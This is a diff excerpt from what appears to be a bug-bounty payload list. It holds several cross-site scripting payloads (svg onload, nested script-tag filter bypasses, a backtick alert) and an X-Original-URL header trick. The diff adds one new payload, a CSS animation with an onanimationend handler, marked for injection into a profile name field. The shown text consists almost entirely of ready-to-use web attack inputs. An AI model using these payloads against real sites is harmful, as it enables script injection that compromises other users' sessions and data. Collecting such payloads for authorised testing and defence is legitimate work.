@@ -21,4 +21,5 @@ X-Original-URL: https:\\samcurry.net/please//work
 <svg/onload=alert(document.domain)>")
 <<!<script>iframe src=javajavascriptscript:alert(document.domain)>
 "><svg onload=alert`XSS`>
+foo style=animation-name:gl-spinner-rotate onanimationend=alert(1)  -- apply this in profile name section
 ```
